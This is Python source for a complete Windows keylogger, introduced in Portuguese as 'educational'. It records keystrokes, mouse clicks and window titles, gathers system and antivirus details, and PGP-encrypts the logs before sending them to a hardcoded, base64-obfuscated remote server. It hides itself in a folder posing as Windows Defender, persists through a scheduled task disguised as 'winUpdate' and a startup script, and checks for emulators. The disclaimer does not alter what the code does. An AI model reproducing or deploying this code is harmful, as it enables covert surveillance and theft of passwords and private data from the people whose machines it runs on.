'''
AVISO: Este código é um exemplo de um keylogger e deve ser usado apenas para fins educacionais e éticos.
O uso indevido deste código pode violar leis e regulamentos locais.
Sempre obtenha permissão explícita antes de monitorar ou registrar a atividade do computador de outra pessoa.

Informações do Código:
    - Este script é um keylogger com fins totalmente educacionais.
    - Ele coleta informações do sistema, como UUID, usuário, sistema operacional, endereço IP, etc.
    - Os dados são encriptados usando PGP e enviados para um servidor remoto.
    - O script adiciona persistência no sistema para ser executado automaticamente ao iniciar o Windows.
    - O script verifica se está sendo executado em um ambiente seguro e não emulado.
    - O script utiliza threads para monitorar eventos do teclado e mouse, além de enviar logs periodicamente.
    - O script exibe uma janela de aviso ao usuário quando executado.
    - O script deve ser executado em um ambiente Windows, pois utiliza bibliotecas específicas do Windows.
'''

from pynput import keyboard, mouse
from screeninfo import get_monitors
import base64, datetime, getpass, json, os, pgpy, platform, psutil, random, requests, socket, subprocess, threading, time, tkinter as tk, win32gui, shutil, sys

CHAVE_ENCRIPTACAO = "-----BEGIN PGP PUBLIC KEY BLOCK-----\n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\nFsTeQy81isFb/BBiOrMGdA==\n=7wsb\n-----END PGP PUBLIC KEY BLOCK-----"
SERVER = base64.b64decode("aHR0cHM6Ly9wdmluaWtzLmNvbS9rbC8=").decode("utf-8")

cache_log = []
cache_log_lock = threading.Lock()
internet = False
intervalo_envio = None
pgp_chavepublica = None
uuid_pc = None

def printar(dados):
    # insere, dentro do arquivo "teste.txt", os dados passados como parâmetro
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("teste.txt", "a") as f:
        f.write(timestamp + " – " + dados + "\n")

def adicionar_persistencia():
    subprocess.run(f'schtasks /create /tn "winUpdate" /f /tr "{os.path.abspath(sys.executable)}" /sc onlogon', shell=True)
    startup_path = os.path.join(os.getenv(base64.b64decode("QVBQREFUQQ==").decode("utf-8")), base64.b64decode("TWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVw").decode("utf-8"))
    with open(os.path.join(startup_path, "update.bat"), "w") as f:
        f.write(f"{os.path.abspath(sys.executable)}")

def aleatorizar_intervalo_envio():
    global intervalo_envio
    intervalo_envio = random.randint(30, 180)

def carregar_chave_publica():
    global pgp_chavepublica
    chavepublica, _ = pgpy.PGPKey.from_blob(CHAVE_ENCRIPTACAO)
    pgp_chavepublica = chavepublica

def copiar_para_caminho():
    printar("Tentar copiar")
    destino = base64.b64decode("QzpcUHJvZ3JhbSBGaWxlc1xXaW5kb3dzIERlZmVuZGVyXE9mZmxpbmVc").decode("utf-8")
    printar("destino: "+str(destino))
    if not os.path.exists(destino):
        os.makedirs(destino, exist_ok=True)
    novo_caminho = os.path.join(destino, os.path.basename(__file__).replace(".py", ".exe"))
    printar("novo_caminho: "+str(novo_caminho))
    if os.path.abspath(sys.executable) != novo_caminho:
        try:
            printar("Copiando "+ os.path.abspath(sys.executable))
            shutil.copy2(os.path.abspath(sys.executable), novo_caminho)
            printar("Copiado!")
        except Exception as e:
            printar("Erro ao copiar: " + str(e))

def detectar_click(x, y, botaoMouse, pressionado):
    if pressionado:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        janela_ativa = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        entrada_log = f"[{timestamp}] [{janela_ativa}] Mouse: Botão {botaoMouse} [Coords: (x {x}), (y {y})]"
        salvar_em_cache(entrada_log)

def detectar_tecla(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    janela_ativa = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    entrada_log = f"[{timestamp}] [{janela_ativa}] {k}"
    salvar_em_cache(entrada_log)

def encriptar_log(dados):
    msg = pgpy.PGPMessage.new(dados)
    encriptado = pgp_chavepublica.encrypt(msg)
    return str(encriptado)

def enviar_post(uuid, datahora, log):
    payload = {
        "uuid": uuid,
        "datahora": datahora,
        "log": log
    }
    headers = {"content-type": "application/json"}
    
    try:
        requests.post(SERVER, data=json.dumps(payload), headers=headers, timeout=10)
    except Exception:
        pass

def executar_novo_programa():
    caminho = base64.b64decode("QzpcUHJvZ3JhbSBGaWxlc1xXaW5kb3dzIERlZmVuZGVyXE9mZmxpbmVc").decode("utf-8") + os.path.basename(__file__).replace(".py", ".exe")
    printar("Caminho: " + str(caminho))
    try:
        printar("Tentando abrir")
        subprocess.Popen(caminho, shell=True)
        printar("Abriu")
    except Exception as e:
        printar("Erro ao abrir o programa: " + str(e))
        pass

def janela_aviso(threads_encerrar):
    root = tk.Tk()
    root.title("Aviso")
    root.geometry("250x100")
    root.resizable(False, False)
    root.eval('tk::PlaceWindow . center')

    label = tk.Label(root, text=base64.b64decode("S2V5bG9nZ2VyIGVtIGV4ZWN1w6fDo28=").decode("utf-8"), font=("Arial", 12))
    label.pack(expand=True)

    def fechar():
        for t in threads_encerrar:
            if hasattr(t, "stop"):
                t.stop()
        root.destroy()
        os._exit(0)

    root.protocol("WM_DELETE_WINDOW", fechar)
    root.mainloop()

def pegar_dados_do_sistema():
    global uuid_pc
    info = []
    gatinho = '''\n \\    /\\\n  )  ( ')\n (  /  )\n  \\(__)|'''
    
    info.append(gatinho)
    info.append(f"UUID do Computador: {uuid_pc}")
    
    info.append(gatinho)
    try:
        info.append(f"Usuário: {getpass.getuser()}")
    except Exception as e:
        info.append(f"Usuário: Erro ({e})")
        
    info.append(gatinho)
    info.append(f"Sistema Operacional: {platform.system()} {platform.release()} ({platform.version()})")
    
    info.append(gatinho)
    info.append(f"Nome do Computador: {platform.node()}")
    
    info.append(gatinho)
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        info.append(f"Endereço IP Local: {ip_address}")
    except Exception as e:
        info.append(f"Endereço IP Local: Erro ({e})")
    
    info.append(gatinho)
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        ip_address = response.json().get("ip", "Não disponível")
        info.append(f"Endereço IP Público: {ip_address}")
    except Exception as e:
        info.append(f"Endereço IP Público: Erro ({e})")
    
    info.append(gatinho)
    try:
        for m in get_monitors():
            info.append(f"Resolução da Tela: {m.width}x{m.height}")
            break
    except Exception:
        info.append("Resolução da Tela: Não disponível")
        
    info.append(gatinho)
    info.append(f"Processador: {platform.processor()}")
    
    info.append(gatinho)
    try:
        mem = psutil.virtual_memory()
        info.append(f"Memória RAM Total: {round(mem.total / (1024**3), 2)} GB")
    except Exception:
        info.append("Memória RAM: Não disponível")
        
    info.append(gatinho)
    try:
        for part in psutil.disk_partitions():
            usage = psutil.disk_usage(part.mountpoint)
            info.append(f"Disco {part.device}: {round(usage.total / (1024**3), 2)} GB")
    except Exception:
        info.append("Disco rígido: Não disponível")
        
    info.append(gatinho)
    try:
        output = subprocess.check_output("wmic path win32_VideoController get name", shell=True, encoding="CP850").encode('utf-8').decode('utf-8')
        lines = [l.strip() for l in output.splitlines() if l.strip() and "Name" not in l]
        for idx, line in enumerate(lines):
            info.append(f"Placa de Vídeo {idx+1}: {line}")
    except Exception:
        info.append("Placa de Vídeo: Não disponível")
        
    info.append(gatinho)
    try:
        output = subprocess.check_output("wmic sounddev get name", shell=True, encoding="CP850").encode('utf-8').decode('utf-8')
        lines = [l.strip() for l in output.splitlines() if l.strip() and "Name" not in l]
        for idx, line in enumerate(lines):
            info.append(f"Placa de Som {idx+1}: {line}")
    except Exception:
        info.append("Placa de Som: Não disponível")
        
    info.append(gatinho)
    try:
        output = subprocess.check_output("wmic nic get name", shell=True, encoding="CP850").encode('utf-8').decode('utf-8')
        lines = [l.strip() for l in output.splitlines() if l.strip() and "Name" not in l]
        for idx, line in enumerate(lines):
            info.append(f"Placa de Rede {idx+1}: {line}")
    except Exception:
        info.append("Placa de Rede: Não disponível")
        
    info.append(gatinho)
    try:
        output = subprocess.check_output(
            [
            "powershell",
            "-Command",
            '(Get-ItemProperty "HKLM:\\HARDWARE\\DESCRIPTION\\System\\BIOS").BaseBoardManufacturer + ", " + (Get-ItemProperty "HKLM:\\HARDWARE\\DESCRIPTION\\System\\BIOS").BaseBoardProduct'
            ],
            shell=True,
            encoding="utf-8"
        )
        lines = [l.strip() for l in output.splitlines() if l.strip() and "Product" not in l]
        for line in lines:
            info.append(f"Placa-mãe: {line}")
    except Exception:
        info.append("Placa-mãe: Não disponível")
        
    info.append(gatinho)
    try:
        output = subprocess.check_output('netsh advfirewall show allprofiles', shell=True, encoding="UTF-8")
        info.append("Firewall:\n" + output)
    except Exception:
        info.append("Firewall: Não disponível")
        
    info.append(gatinho)
    try:
        output = subprocess.check_output('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName', shell=True, encoding="CP850").encode('utf-8').decode('utf-8')
        lines = [l.strip() for l in output.splitlines() if l.strip() and "displayName" not in l]
        for idx, line in enumerate(lines):
            info.append(f"Antivírus {idx+1}: {line}")
    except Exception:
        info.append("Antivírus: Não disponível")
    
    info.append('''

    ⠀⠀⣰⣦⣢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⢰⣾⣿⣷⡥⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⢸⣿⣿⡿⣷⣡⠀⠀⠀⠀⠀⠀⠀⠀⡀⠤⠀⠀⠀⠀⢀⠠⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⢸⣿⣿⣷⣿⡧⡆⠀⠀⠀⠀⣔⣦⣜⢼⡿⣯⣂⣀⢴⣿⡿⢿⣎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⢸⢿⣿⣿⣈⣟⡇⠀⢀⢠⣄⣷⠟⠻⠿⠛⠊⠉⠉⠚⢹⣿⣖⣀⠄⡀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⣀⠀⠀⠀⠀⠀⠀
    ⠀⠈⣾⣿⣿⣿⣏⡧⣢⣿⡿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⢿⣾⣔⢄⡀⢀⣠⣲⣼⣷⣶⣿⣿⣾⣾⣿⣤⣒⢄⠀
    ⠀⠀⠘⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣷⣶⣿⣿⣟⣛⣿⣿⣾⡟⣶⣿⣾⣿⡿⡿⠇
    ⠀⠀⠀⠣⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣻⠟⡻⢿⣿⣿⣿⡿⢿⣟⠻⠟⠃⠀⠀
    ⠀⠀⠀⠀⠸⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⢸⣼⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⢸⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⢸⣽⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠘⣿⣿⡄⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣦⠀⠀⠀⠀⠻⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⢰⣏⡉⠀⠀⠀⠀⠀⢿⡿⠃⠀⠀⠀⣠⣤⣄⠀⠀⠀⠀⠻⠟⠀⠀⠀⠀⠰⣿⣕⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⢠⢻⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⢟⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⢏⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠈⠩⢿⢿⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⡿⣟⠝⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢉⡻⢿⣿⣿⣿⣿⣶⣶⣶⣶⡦⠀⠀⣶⣶⣶⣾⣿⣿⣿⣿⣷⣮⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⢀⢠⣦⣷⣿⣿⣿⣿⣿⣯⣟⡿⣿⢿⣷⡆⢀⣼⣿⣿⣻⣯⣿⣿⣿⣿⣾⣯⣔⡤⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⡠⣷⣿⣿⣟⣯⢿⣽⣿⣿⣿⣿⣿⣿⢯⣟⡿⣿⢿⣻⣾⣿⡿⣿⣻⣽⣷⣻⢿⣿⣿⣶⣅⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⢠⣺⣾⠟⠉⠻⣿⣯⣿⣿⣿⣟⡷⣯⣟⣾⢿⣽⣻⣽⢿⣽⣻⢾⣽⡷⣿⣿⣿⣿⣟⣾⡿⠛⢿⣮⡢⠀⠀⠀⠀⠀⠀⠀⠀
    ⣷⣿⠁⠀⠀⠀⢨⣿⣿⣿⣻⣞⣿⡽⣾⢯⣿⢾⣽⡾⣯⡷⣟⣯⡷⣿⣳⣯⢿⣿⣿⡁⠀⠀⠀⢻⣷⣇⠀⠀⠀⠀⠀⠀⠀
    ⣿⣿⡄⠀⠀⢠⣿⣿⣿⣾⣷⣿⣾⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣯⣿⣿⣿⣷⠀⠀⠀⢸⣿⢺⠀⠀⠀⠀⠀⠀⠀
    ⠙⠹⣿⠶⢦⣼⣿⠿⠛⠛⠛⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠋⠛⠛⠛⠛⠿⣿⣇⣠⣴⣿⢟⠋⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠈⡅⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⠟⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⡁⣿⡇⠀⠀⠀⠀⠀⠀⢠⣄⡀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⢀⣿⣏⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠸⣿⣿⡀⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣤⣤⣶⠿⠟⠋⠀⠀⠀⠀⠀⣼⣿⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠘⣻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠁⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⡑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢸⣻⣏⣀⣤⣄⣀⣀⣀⣀⣀⣀⣼⣿⣀⣀⣀⣀⣀⣀⣀⣠⣿⣟⡫⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠈⠈⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠓⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀''')

    dados = "\n".join(info)
    encriptado = encriptar_log(dados)
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    enviar_post(uuid_pc, timestamp, encriptado)

def pegar_uuid():
    try:
        output = subprocess.check_output("wmic csproduct get uuid", shell=True, encoding="CP850").encode('utf-8').decode('utf-8')
        lines = [l.strip() for l in output.splitlines() if l.strip() and "UUID" not in l]
        if lines:
            return lines[0]
    except Exception:
        pass
    try:
        output = subprocess.check_output(
            [
                "powershell",
                "-Command",
                '(Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Cryptography").MachineGuid'
            ],
            shell=True,
            encoding="utf-8"
        )
        lines = [l.strip() for l in output.splitlines() if l.strip()]
        if lines:
            return lines[0]
    except Exception:
        pass
    return "FF0000FF-0000-0000-0000-0000000000FF"

def salvar_em_cache(dados):
    with cache_log_lock:
        cache_log.append(dados)

def thread_encriptar_e_enviar():
    global uuid_pc
    thread = threading.current_thread()

    while not getattr(thread, 'stopped', lambda: False)():
        try:
            time.sleep(intervalo_envio)

            with cache_log_lock:
                dados = "\n".join(cache_log) if cache_log else ""
                if dados:
                    cache_log.clear()
            if dados:
                encriptado = encriptar_log(dados)
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                enviar_post(uuid_pc, timestamp, encriptado)
            
            aleatorizar_intervalo_envio()
        except Exception:
            time.sleep(5)

def thread_janelas():
    ultima_janela = ""
    thread = threading.current_thread()

    try:
        while not getattr(thread, 'stopped', lambda: False)():
            janela = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if janela != ultima_janela:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                entrada_log = f"[{timestamp}] [JANELA] {janela}"
                salvar_em_cache(entrada_log)
                ultima_janela = janela
            time.sleep(1)
    except Exception:
        time.sleep(5)

def thread_teclado():
    thread = threading.current_thread()

    try:
        while not getattr(thread, 'stopped', lambda: False)():
            with keyboard.Listener(on_press=detectar_tecla) as listener:
                listener.join()
    except Exception:
        time.sleep(5)

def thread_mouse():
    thread = threading.current_thread()
    
    try:
        while not getattr(thread, 'stopped', lambda: False)():
            with mouse.Listener(on_click=detectar_click) as listener:
                listener.join()
    except Exception:
        time.sleep(5)

def verifica_caminho():
    caminho = os.path.abspath(sys.executable)
    if not caminho.startswith(base64.b64decode("QzpcUHJvZ3JhbSBGaWxlc1xXaW5kb3dzIERlZmVuZGVyXE9mZmxpbmVc").decode("utf-8")):
        return False
    else:
        return True

def verifica_emulador():
    if os.cpu_count() <= 1:
        return True
    return False

def verifica_processo():
    i = 0
    nomeProcesso = os.path.basename(__file__).replace(".py", ".exe")
    for proc in psutil.process_iter():
        if proc.name() == nomeProcesso:
            i += 1
    if i > 2:
        return True
    return False

class thread_com_parar(threading.Thread):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._stop_event = threading.Event()
    
    def stop(self):
        self._stop_event.set()
        
    def stopped(self):
        return self._stop_event.is_set()

def main():
    threads = [
        threading.Thread(target=thread_encriptar_e_enviar, daemon=True),
        threading.Thread(target=thread_janelas, daemon=True),
        threading.Thread(target=thread_teclado, daemon=True),
        threading.Thread(target=thread_mouse, daemon=True),
    ]
    printar(str(threads))
    threading.Thread(target=janela_aviso, args=(threads,), daemon=False).start()
    printar("Janela de aviso iniciada.")
    global internet, uuid_pc
    while not internet:
        printar("Tentando conectar à internet...")
        try:
            requests.get("https://www.google.com/", timeout=5)
            internet = True
            printar("Conexão com a internet estabelecida.")
        except requests.ConnectionError:
            internet = False
            time.sleep(5)
    carregar_chave_publica()
    aleatorizar_intervalo_envio()
    printar("Chave pública carregada e intervalo de envio aleatorizado:" + str(intervalo_envio) + " segundos.")
    uuid_pc = pegar_uuid()
    printar("UUID do computador obtido: " + str(uuid_pc))
    printar("Pegando dados do sistema...")
    pegar_dados_do_sistema()
    for t in threads:
        t.start()
    while True:
        time.sleep(30)

if __name__ == "__main__":
    if verifica_processo() or verifica_emulador():
        printar("Verificação de processo ou emulador falhou, encerrando programa.")
        os._exit(0)
    else:
        if not verifica_caminho():
            printar("Caminho inválido, copiando programa.")
            copiar_para_caminho()
            printar("Adicionando persistência.")
            adicionar_persistencia()
            printar("Executando novo programa.")
            executar_novo_programa()
            printar("Encerrando programa.")
            os._exit(0)
        else:
            printar("Executando programa.")
            main()
